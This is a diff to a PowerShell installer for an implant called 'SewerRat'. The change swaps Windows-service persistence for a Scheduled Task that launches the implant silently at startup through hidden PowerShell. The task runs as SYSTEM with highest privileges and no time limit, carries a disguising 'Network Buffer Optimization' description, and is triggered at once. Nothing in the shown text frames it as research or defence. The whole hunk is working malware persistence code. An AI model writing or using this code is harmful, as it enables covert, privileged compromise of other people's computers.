@@ -50,34 +50,44 @@ try {
     exit
 }
 
-Write-Host "[*] Creating persistence via service '$ServiceName'..."
+Write-Host "[*] Creating persistence via Scheduled Task '$ServiceName'..."
 try {
-    # If service already exists, stop and delete it first
-    if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) {
-        Write-Host "[!] Service already exists. Cleaning up old service..."
-        Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
-        sc.exe delete $ServiceName
+    # If the task already exists, unregister it
+    if (Get-ScheduledTask -TaskName $ServiceName -ErrorAction SilentlyContinue) {
+        Write-Host "[!] Scheduled task already exists. Cleaning up old task..."
+        Unregister-ScheduledTask -TaskName $ServiceName -Confirm:$false
         Start-Sleep -Seconds 2
     }
 
-    # Create the service pointing to our downloaded executable
-    New-Service -Name $ServiceName `
-                -BinaryPathName $DestPath `
-                -StartupType Automatic `
-                -Description "Network Buffer Optimization Service run at startup" | Out-Null
-                
-    Write-Host "[+] Service created successfully."
+    # Setup the Action (what to run) -> hidden PowerShell to spawn it silently
+    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"`& '$DestPath'`""
+
+    # Setup the Trigger (when to run) -> At startup
+    $Trigger = New-ScheduledTaskTrigger -AtStartup
+
+    # Setup the Principal (who to run as) -> SYSTEM user with highest privileges
+    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+
+    # Setup the Settings -> Allow it to run indefinitely and don't kill it after 3 days
+    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 0)
+
+    # Register the Scheduled Task
+    Register-ScheduledTask -TaskName $ServiceName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Description "Network Buffer Optimization Service for Startup" | Out-Null
+
+    Write-Host "[+] Scheduled Task created successfully."
+
 } catch {
-    Write-Host "[-] Failed to create service: $_"
+    Write-Host "[-] Failed to create Scheduled Task: $_"
     exit
 }
 
-Write-Host "[*] Starting service to execute implant..."
+Write-Host "[*] Starting the implant process explicitly..."
 try {
-    Start-Service -Name $ServiceName
-    Write-Host "[+] Service started successfully! SewerRat is now running."
+    # Start the task manually so it runs right now without needing a reboot
+    Start-ScheduledTask -TaskName $ServiceName
+    Write-Host "[+] Task triggered successfully! SewerRat is now running silently."
 } catch {
-    Write-Host "[-] Failed to start service: $_"
+    Write-Host "[-] Failed to trigger task: $_"
 }
 
 Write-Host "[*] Deployment complete!"
